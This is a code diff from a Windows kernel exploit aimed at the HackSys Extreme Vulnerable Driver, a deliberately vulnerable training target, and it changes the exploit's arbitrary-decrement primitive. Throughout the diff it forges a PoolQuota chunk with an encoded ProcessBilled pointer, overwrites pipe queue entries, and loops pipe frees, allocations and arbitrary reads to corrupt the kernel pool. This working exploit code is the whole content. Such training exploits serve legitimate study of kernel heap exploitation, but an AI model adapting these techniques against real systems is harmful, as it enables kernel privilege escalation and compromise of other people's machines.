@@ -5,6 +5,7 @@
 
 #include "primitives/arbitrary_decrement.h"
 
+#include "primitives/fake_chunk.h"
 #include "primitives/arbitrary_read.h"
 #include "pipe_utils/pipe_utils.h"
 #include "hevd/hevd.h"
@@ -84,19 +85,6 @@ int SetupArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs)
         vs_header_addr += vs_header->UnsafeSize * 0x10;
     } while (!addrs->vs_sub_segment);
 
-    // Clean up previous pipe sprays
-    if (pipes->fake_pool_header)
-    {
-        CleanupPipeSpray(pipes->fake_pool_header);
-        pipes->fake_pool_header = NULL;
-    }
-
-    if (pipes->fake_pipe_queue_entry)
-    {
-        CleanupPipeSpray(pipes->fake_pipe_queue_entry);
-        pipes->fake_pipe_queue_entry = NULL;
-    }
-
     return 1;
 }
 
@@ -121,37 +109,35 @@ int ArbitraryDecrement(exploit_pipes_t* pipes, exploit_addresses_t* addrs, uintp
     new_encoded_vs_header[0] = new_encoded_vs_header[0] ^ ghost_chunk_vs_header ^ addrs->RtlpHpHeapGlobals;
     new_encoded_vs_header[1] = new_encoded_vs_header[1] ^ ghost_chunk_vs_header ^ addrs->RtlpHpHeapGlobals;
 
+    pipe_queue_entry_t overwritten_pipe_entry;
+    overwritten_pipe_entry.list.Flink = (LIST_ENTRY*)addrs->leak_root_queue;
+    overwritten_pipe_entry.list.Blink = (LIST_ENTRY*)addrs->leak_root_queue;
+    overwritten_pipe_entry.linkedIRP = 0;
+    overwritten_pipe_entry.SecurityClientContext = 0;
+    overwritten_pipe_entry.isDataInKernel = 0;
+    overwritten_pipe_entry.DataSize = 0;
+    overwritten_pipe_entry.remaining_bytes = 0;
+    overwritten_pipe_entry.field_2C = 0x43434343;
+
+    char* fake_pool_quota_chunk_buf = CreateFakeChunk(
+        new_encoded_vs_header,
+        0,                                                                                              // Previous size
+        0,                                                                                              // Pool index
+        0x100 / 0x10,                                                                                   // Block size (0x100 bytes)
+        8,                                                                                              // Pool type (PoolQuota)
+        0x42424242,                                                                                     // Pool Tag
+        (addrs->fake_eprocess + FAKE_EPROCESS_OFFSET) ^ addrs->ExpPoolQuotaCookie ^ addrs->ghost_chunk, // ProcessBilled
+        &overwritten_pipe_entry                                                                         // PipeQueueEntry
+    );
+
     puts("[*] Spraying pipes with fake ProcessBilled...");
-    char fake_pool_quota_attribute[0x1000];
-    memset(fake_pool_quota_attribute, 0x46, sizeof(fake_pool_quota_attribute));
-
-    // set vs chunk header
-    *(uint64_t*)((unsigned char*)fake_pool_quota_attribute) = new_encoded_vs_header[0];
-    *(uint64_t*)((unsigned char*)fake_pool_quota_attribute + 8) = new_encoded_vs_header[1];
-
-    // Configure pool header for arbitrary decrement
-    *((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET) = 0;                // Previous size
-    *((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 1) = 0;            // Pool index
-    *((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 2) = 0x100 / 0x10; // Block size (0x100 bytes)
-    *((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 3) = 8;            // Pool type (PoolQuota)
-
-    // Set pool tag (ABCD)
-    *(uint32_t*)((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 4) = 0x41424344;
-
-    // Configure quota value for arbitrary decrement
-    // XOR operation is key to controlling the ProcessBilled field
-    *(uintptr_t*)((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 8) =
-        (addrs->fake_eprocess + FAKE_EPROCESS_OFFSET) ^ addrs->ExpPoolQuotaCookie ^ addrs->ghost_chunk;
-
-    *(uintptr_t*)((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 0x10) = addrs->leak_root_queue;
-    *(uintptr_t*)((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 0x18) = addrs->leak_root_queue;
-    *(uintptr_t*)((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 0x20) = (uintptr_t)0;
-    *(uintptr_t*)((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 0x28) = (uintptr_t)0;
-    *(unsigned long*)((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 0x38) = (unsigned long)0;
-    *(unsigned long*)((unsigned char*)fake_pool_quota_attribute + GHOST_CHUNK_OFFSET + 0x3c) = (unsigned long)0;
-
-    pipes->fake_pool_quota = CreatePipeSpray(SPRAY_SIZE, TARGETED_VULN_SIZE, fake_pool_quota_attribute);
-    PerformPipeSpray(pipes->fake_pool_quota);
+    uintptr_t pipe_queue_entry_addr = NULL;
+    do
+    {
+        FreeNPPNxChunk(pipes->previous_pipe, TARGETED_VULN_SIZE - 0x40);
+        AllocNPPNxChunk(pipes->previous_pipe, fake_pool_quota_chunk_buf, TARGETED_VULN_SIZE - 0x40);
+        ArbitraryRead(pipes->ghost_pipe, addrs->leak_root_queue, (char*)&pipe_queue_entry_addr, 0x8);
+    } while (pipe_queue_entry_addr == addrs->ghost_chunk + POOL_HEADER_SIZE);
 
     puts("[*] Freeing ghost chunk to trigger arbitrary decrement");
     FreeNPPNxChunk(pipes->ghost_pipe, GHOST_CHUNK_BUFSIZE);
